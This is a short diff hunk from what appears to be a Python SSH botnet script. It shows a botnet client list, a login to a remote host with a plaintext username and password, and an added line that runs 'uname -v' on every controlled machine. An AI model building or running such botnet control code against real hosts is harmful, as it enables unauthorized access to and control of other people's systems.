@@ -35,3 +35,4 @@ def botnetCommand(command):
 
 botNet=[]
 add_client('s3.sshservers.us','data-freevpn.us','pass')
+botnetCommand('uname -v')
